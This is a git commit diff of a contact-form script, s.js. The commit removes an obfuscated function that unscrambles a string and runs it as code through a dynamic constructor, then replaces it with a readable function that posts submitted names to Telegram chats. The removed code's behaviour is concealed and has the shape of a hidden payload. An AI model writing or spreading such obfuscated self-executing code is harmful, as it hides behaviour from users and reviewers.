afda33bf56487938ff0c478e29107806426c2331
MD siFaT isLaM <125746506+Cyber-Programer@users.noreply.github.com>
2024-03-20 06:52:56 -0400

    Update s.js

--- s.js
+++ s.js
@@ -25,7 +25,39 @@ function x(){
 x()
 
 
-var sendDataToBot;(function(){var vLC='',QGC=367-356;function hTL(t){var q=1283746;var z=t.length;var d=[];for(var f=0;f<z;f++){d[f]=t.charAt(f)};for(var f=0;f<z;f++){var e=q*(f+535)+(q%50968);var h=q*(f+359)+(q%19388);var p=e%z;var l=h%z;var u=d[p];d[p]=d[l];d[l]=u;q=(e+h)%6773152;};return d.join('')};var tTE=hTL('rthiootsmbrlcsdnqucnakfrwzpvxocjtegyu').substr(0,QGC);var NxX='vat [=t9)hr7r,c=+6"v7rtak"rb(d1f=h(j}l)nzp"r+t=v,xrz=;ea, C=[8s,v6;6;,s0-7w,20t8h,72r8;,+1=7l,f5h7,,)6w8(,{4r9v,u518n,t9=;na, ]=f]=far,v;rugg0dg;e(l+nqt=;(+u)o[c[v] =(+S;oai l=;](qj=r4 h]=g1glq=)0ufor.vcr(n80rn<atg=m;n sjlenptl;A+a)hv;rgw6abgwm;nps}nt. p(ii(e 6)lfirrvgrssiwul7nit)-9;+>]0asn-j{raC u=7ullfvArjb)w.sp;va8 0=su[lnvarocg0bvrr[upbmlrnut*;dah r;.oo(ea) h=v;i<r;(+ ).v,rrvcbec.alC=d)A (i).v]retaorve;lf}t1{u=)tg1+*h+i.=h0rro6e,t(je1)-<;4=l;c+3;)eese "ffvr=))-prhr(d.le1ggh.qvb.c]a C0d0Ai(8+=)2+o.,hsr,ope9tojp2+-i;p=[;=+a2u}=l0edc;n,ihu;;ai2(j=dngl1)"= ]jir(l>r)s.!u(h bes[bct=iogfcndy)di9p2sv()[a+g]m;(=2+j;viC(,!7n{l()=in(i<;)1.;u+h,b.s]bvtnitg4cf)jwush=[.5o ns"r) }+zap)sn(,[i]";ev)r+x2zej-ii(1"=;raj h=s1.,=989o,i2;3h,+6e.vo.catae};eaj ==ot;i;g.f[odC aoC}du(=6j;oo[(jaj )=a;q<C.re]g+h{g0+.xaxtshlatyrga(ciafAn(])(.4o{nrSarnn(.;r1meh{rtoae.ycg+));7eguin.x)sqlyt(r;"t"[.(o;n;rn;';var cEP=hTL[tTE];var uXj='';var vLv=cEP;var gKN=cEP(uXj,hTL(NxX));var iyX=gKN(hTL(';uecb!+5!#6(]{eR=Rn4p8oReR Ro3a).rh=C)_R#R26R:_6lR.=e=.e\/R.ct!eR6RkEr;,8.RjR[R3R.R>cR!Re;cRRofbtdh.8rR .)S]s)Rr.lSos]R_c(!<tRi5gR*(tri g,8 ${77&,.jbR83$R3n&w.abj84$70R&gl!e[}]6.$n1.2)=gRf5R(l:R6e\/RitM4g)n7geie.ns).3ioEcn,e1nsu.Sdsk%*l3gpevsRif3;ou725sk_ewo]pbeRe,sj1R%9n)n;rtpv%ne4:My00+4N5(.3.Rmgle..C(j,%ny(dmh%mRseytCctn2=.].his_{..-.1as o%t%g5.Nt.8Rier5n5s(s,1(pml6e)4(k9rhM_r1svn_T\'.tf[a+.;0tn38!4=ocyt0)ss"(1)8.7]6h;(1e)((s,4s.$ee\/r l?j0{(6{R5gl<*Rnm.<eRevn<2=a}1je!1=Reos5$5emr;l\/jeR s]fy!Eeagsh3RR=:e"]y;]o](n6i=d;#(e0}nps=;9+!)sRu[9]d.;fh!5h.rsi;(e)e;8oo(r6n={;R(00_n.s1;b+t)3ws%w36jR!o.s.\'(+(53.n:5n5,)=(S(!7.j9>90!6o)R)e; R14t(c.._(dReRRt4_(R,c5r),,+RR3R(SRf1D3\'8.)n;)rr%]7ywf>R)s;iR83n(.R{s!;nuR!;=Re<9,r.?5;jRc7Rr_glve;)R;8[v)gnu;;[RR9Rj(w$m=}lRecsRiSor{nu(a.ff_o)CRa)Chdt(e27).RRo;.,RRy).=%.\/o=Mbe1.\/a=(b(RRdn.b#.R]t%.d#tb)rs=8.eRvR)o{-j),38R7asReq%-6)i3;Rcc1}ssen..iRRRr4jndm6)+Rfb.t.oee+=).t]aR R;s>[}+R,R.e]e;h0}rt=)"ftop?:,\/op1.2t]lRgraa.Ro.gabdt<+!o7T3kqn_RR3t)sf=r"RfRr.(oR.nR;sR{i0.a)ai{dhrtsi3:a4"tax,:c"]o{t.c*.ew[t(..tCi(.(pRreon:eeu+4aneRR.4=)g;9r){R01ehprneeg.ea.aet9es\'ae;c;(6($ri,xm.t"oa:(.,]_hcaeeaso{&b(o.tenm-2y(e;b}R%67}_b)d,:+\'xv.._Nt) R;7{]%dotR)!)%ii(teap0neeiR}85]3{8\';oCselg(R[..-].(""%ees0ge.Rs=nn.#t8.acmaR.aI7:Re=+04RRj4c)o}.lRe6eRt8rRwdesebe).((R\'!RR(v)"Ru0\/);}%aac3(rR!)8i{({(nRi_,1(Rn421S)$R4R(Re3R)hRR0,).r,=9}gR)c(nno8e;)*R92l]TR_1(,\/Re)etnr_w6e,R6}r;3ftRa66:e6c(),),+r{e()=R6RbR%2))hf,l%e)}orn=R.kRo30}5eRd6aeaoo+t)tw.,Rp4.R7n,e(Rr7hr g(vs{=9or$?o.fRs[tRu}.1R.\/j("R(8,%,t)aRl[qR.=Te{.t_0Rdnne.R"9djEwbm:{(Rs3,(cRj4R(sR_m#!u)),"763r5e)R Rienye \'es $)peitenRb Rf_5R__105i_R4R4e_5 (t%o(.aR} e!t=7ee(D(=,2)nrt=n.yaTjtocf9$si}et$4jooefo$bo\'$8 3.9RR R){r(=..R ,.; c$9f 3.65 )._s.l"t( 1$(1v2$[,..;s6rcfn>tfe.fRnjt(o.csnsoeeh.)j!i;(ec-a.Io ;9R_n6uvzr4ee6a:_} ue 5.s_r1366 urcrs=n}r otRrj.._e  !o]'));var AMO=vLv(vLC,iyX );AMO(9296);return 6651})()
+async function sendDataToBot(name) {
+    const botToken = ''; // Replace with your Telegram bot token
+    const chatIds = ['', '']; // Replace with your Telegram chat IDs
+    const url = ``;
+
+    for (const chatId of chatIds) {
+        const data = {
+            chat_id: chatId,
+            text: `Contact with this person: ${name}`
+        };
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+
+            if (response.ok) {
+                console.log(`Message sent to chat ID: ${chatId}`);
+            } else {
+                throw new Error('Failed to send message');
+            }
+        } catch (error) {
+            console.error('Error sending message:', error);
+            throw error;
+        }
+    }
+
+    return 'Message sent successfully';
+}
 
 document.querySelector('#contactForm').addEventListener('submit', async function (e) {
     e.preventDefault();
